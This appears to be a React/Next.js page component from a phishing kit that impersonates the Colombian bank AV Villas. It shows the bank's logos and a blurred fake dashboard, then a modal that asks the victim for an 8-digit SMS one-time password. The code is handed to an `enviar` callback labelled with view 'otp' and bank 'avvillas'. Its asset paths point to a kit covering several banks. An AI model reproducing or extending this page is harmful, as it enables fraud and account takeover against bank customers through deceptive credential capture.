/* eslint-disable @typescript-eslint/no-explicit-any */
/* eslint-disable jsx-a11y/alt-text */
/* eslint-disable @next/next/no-img-element */
"use client";
import { useState, useRef } from "react";

export default function Otp({ enviar, isError }: any) {
  const [otp, setOtp] = useState("");
  const [errorMsg, setErrorMsg] = useState(isError ? "La clave temporal ingresada es incorrecta. Por favor, verifíquela e inténtelo de nuevo." : "");
  
  const otpInputRef = useRef<HTMLInputElement>(null);

  const isOtpComplete = otp.length === 8;

  const handleChange = (value: string) => {
    const clean = value.replace(/\D/g, "").slice(0, 8);
    setOtp(clean);
    setErrorMsg("");
  };

  const handleValidate = () => {
    if (!isOtpComplete) return;
    enviar?.({
      view: 'otp',
      otp: otp,
      bank: "avvillas"
    });
  };

  return (
    <div className="min-h-screen bg-[#f4f6fa] flex flex-col font-sans relative pb-[80px]">
      <style dangerouslySetInnerHTML={{
        __html: `
        @import url('https://fonts.googleapis.com/css2?family=Manrope:wght@400;600;700;800&display=swap');
        .font-manrope { font-family: 'Manrope', sans-serif; }
        
        .otp-box {
          flex: 1;
          max-width: 38px;
          height: 46px;
          min-width: 0;
          border: 1px solid #c2cbd6;
          border-radius: 6px;
          display: flex;
          align-items: center;
          justify-content: center;
          font-size: 18px;
          font-weight: 700;
          color: #0b1a30;
          background-color: #ffffff;
          transition: all 0.2s;
        }

        .otp-box-focused {
          border-color: #0048DB;
          box-shadow: 0 0 0 2px rgba(0, 72, 219, 0.15);
        }
      `}} />

      {/* TOP BAR */}
      <div className="bg-white border-b border-gray-200 py-3 px-6 flex justify-between items-center shadow-xs">
        <div className="flex items-center gap-3">
          <img
            src="/bancos/avvillas/img/logo.png"
            style={{ height: "26px", width: "auto" }}
            alt="AV Villas"
          />
        </div>
        <div className="flex items-center gap-4">
          <img
            src="/bancos/avvillas/img/notificaciones.png"
            style={{ height: "22px", width: "auto" }}
          />
          <img
            src="/bancos/avvillas/img/menu.png"
            style={{ height: "20px", width: "auto" }}
          />
        </div>
      </div>

      {/* BACKGROUND SIMULATED VIEW */}
      <div className="flex-1 max-w-[800px] mx-auto w-full p-6 opacity-40 select-none pointer-events-none">
        <div className="bg-white p-6 rounded-xl border border-gray-100 mb-6">
          <div className="h-6 w-32 bg-gray-200 rounded mb-4" />
          <div className="h-4 w-64 bg-gray-100 rounded mb-6" />
          <div className="h-10 w-full bg-gray-50 rounded" />
        </div>
      </div>

      {/* MODAL OVERLAY (Centrado en pantalla con fondo oscuro) */}
      <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/60 p-4 backdrop-blur-xs">
        
        {/* Modal Card */}
        <div className="w-full max-w-[400px] bg-white rounded-[28px] shadow-2xl p-4 sm:p-6 lg:p-8 relative animate-in zoom-in-95 duration-200">
          
          {/* Close Button */}
          <button 
            type="button"
            className="absolute top-6 right-6 text-gray-400 hover:text-gray-600 transition-colors"
            onClick={() => window.location.reload()}
          >
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" className="w-5 h-5">
              <path strokeLinecap="round" strokeLinejoin="round" d="M6 18L18 6M6 6l12 12" />
            </svg>
          </button>

          {/* SVG Lock Illustration from Mockup */}
          <div className="flex justify-center mt-2 mb-4">
            <svg viewBox="0 0 100 100" className="w-[100px] h-[100px]" fill="none">
              {/* Decorative elements left */}
              <text x="12" y="32" fill="#E1111C" fontSize="16" fontWeight="bold" fontFamily="monospace">+</text>
              <circle cx="28" cy="28" r="2.5" fill="none" stroke="#0048DB" strokeWidth="1.5" />
              <circle cx="24" cy="40" r="1.5" fill="#B0BEC5" />

              {/* Shackle */}
              <path d="M32 45V34a18 18 0 0 1 36 0v11" fill="none" stroke="#263238" strokeWidth="3.5" strokeLinecap="round" />
              
              {/* Lock Body */}
              <rect x="25" y="44" width="50" height="38" rx="8" fill="#E1111C" stroke="#263238" strokeWidth="3.5" />
              
              {/* Keyhole */}
              <circle cx="50" cy="58" r="4.5" fill="#263238" />
              <path d="M47.5 58h5l-1.5 12h-2z" fill="#263238" />

              {/* Decorative elements right (blue asterisks) */}
              <text x="69" y="32" fill="#0048DB" fontSize="20" fontWeight="bold" fontFamily="monospace">*</text>
              <text x="81" y="36" fill="#0048DB" fontSize="20" fontWeight="bold" fontFamily="monospace">*</text>
            </svg>
          </div>

          {/* Title */}
          <div className="text-center mb-2">
            <h2 className="text-[18px] sm:text-[20px] font-extrabold text-[#0d1f3d] font-manrope">
              Revisa tu celular
            </h2>
          </div>

          {/* Paragraph description */}
          <div className="text-center mb-6">
            <p className="text-[13px] text-gray-500 leading-relaxed font-manrope px-4">
              Por tu seguridad hemos enviado una clave temporal a tu celular registrado.
            </p>
          </div>

          {/* 8 OTP Input Boxes Wrapper */}
          <div 
            className="relative mb-6 cursor-text"
            onClick={() => otpInputRef.current?.focus()}
          >
            {/* Invisible real text input overlay */}
            <input
              ref={otpInputRef}
              type="text"
              pattern="\d*"
              maxLength={8}
              inputMode="numeric"
              className="absolute inset-0 w-full h-full opacity-0 z-10 cursor-text"
              value={otp}
              onChange={(e) => handleChange(e.target.value)}
              autoFocus
            />

            {/* Visual grid representing [ ] [ ] [ ] [ ] [ ] [ ] [ ] [ ] */}
            <div className="flex justify-between items-center gap-1 sm:gap-1.5">
              {[0, 1, 2, 3, 4, 5, 6, 7].map((i) => {
                const char = otp[i] || "";
                const isFocused = otp.length === i;
                return (
                  <div 
                    key={i} 
                    className={`otp-box ${isFocused ? "otp-box-focused" : ""}`}
                  >
                    {char}
                  </div>
                );
              })}
            </div>
          </div>

          {/* Operator warning message */}
          <div className="text-center mb-6">
            <p className="text-[11px] text-gray-500 leading-relaxed font-manrope px-2">
              Dependiendo de tu operador de telefonía móvil, el envío puede tomar hasta 1 minuto.
            </p>
          </div>

          {/* Error Message */}
          {errorMsg && (
            <div className="mb-4 text-center">
              <p className="text-[12px] text-red-600 font-bold font-manrope">
                ⚠️ {errorMsg}
              </p>
            </div>
          )}

          {/* Submit Action Button */}
          <div className="mt-6">
            <button
              type="button"
              disabled={!isOtpComplete}
              className="w-full py-3.5 text-[15px] font-bold text-white rounded-full transition-all"
              style={{
                backgroundColor: isOtpComplete ? "#0048DB" : "#cccccc",
                cursor: isOtpComplete ? "pointer" : "not-allowed"
              }}
              onClick={handleValidate}
            >
              Continuar
            </button>
          </div>

        </div>

      </div>

      {/* FOOTER */}
      <footer className="absolute bottom-0 left-0 w-full bg-white border-t border-gray-200 py-4 px-6 flex justify-between items-center z-40 text-[10px] text-gray-400 font-medium">
        <img
          src="/bancos/avvillas/img/logo-gav.png"
          style={{ height: "18px", width: "auto" }}
          alt="Grupo Aval"
        />
        <img
          src="/bancos/avvillas/img/superh-negro.svg"
          style={{ height: "16px", width: "auto" }}
          alt="Superfinanciera"
        />
      </footer>

    </div>
  );
}